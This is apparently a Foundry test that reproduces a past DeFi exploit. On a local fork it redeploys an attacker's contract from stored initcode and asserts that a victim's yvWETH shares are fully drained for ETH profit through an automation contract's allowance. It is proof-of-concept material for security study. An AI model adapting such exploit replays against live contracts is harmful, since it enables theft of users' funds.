    function setUp() public {
        // Online warm: use mainnet alias; exhaustive_warm rewrites to anvil localhost.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = address(0); // native ETH
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        uint256 shares = IYvWETH(YVWETH).balanceOf(VICTIM);
        uint256 allowance_ = IYvWETH(YVWETH).allowance(VICTIM, AUTOMATION);
        require(shares == STOLEN_SHARES, "unexpected victim shares");
        require(allowance_ >= shares, "automation lacks yvWETH allowance");
        require(AUTOMATION.code.length > 0, "automation missing");

        uint256 attackerBefore = ATTACKER.balance;

        // Replay historical CREATE (attacker nonce 0 → ATTACK_CONTRACT).
        vm.startPrank(ATTACKER, ATTACKER);
        vm.setNonce(ATTACKER, 0);
        address deployed;
        bytes memory initcode = CREATE_INITCODE;
        assembly {
            deployed := create(0, add(initcode, 0x20), mload(initcode))
        }
        require(deployed != address(0), "CREATE failed");
        require(deployed == ATTACK_CONTRACT, "CREATE address mismatch");
        vm.stopPrank();

        uint256 profit = ATTACKER.balance - attackerBefore;
        uint256 victimAfter = IYvWETH(YVWETH).balanceOf(VICTIM);

        assertEq(profit, EXPECTED_PROFIT, "attacker ETH profit mismatch");
        assertEq(victimAfter, 0, "victim yvWETH not fully drained");

        emit log_named_decimal_uint("Attacker ETH profit", profit, 18);
        emit log_named_decimal_uint("Victim yvWETH before", shares, 18);
        emit log_named_decimal_uint("Victim yvWETH after", victimAfter, 18);
        emit log_named_address("Attack factory", deployed);
        emit log_named_address("Vulnerable automation", AUTOMATION);
        emit log_named_address("Strategy stETH accum", STRATEGY_STETH);
        emit log_named_address("Strategy router V3", STRATEGY_ROUTER);
    }
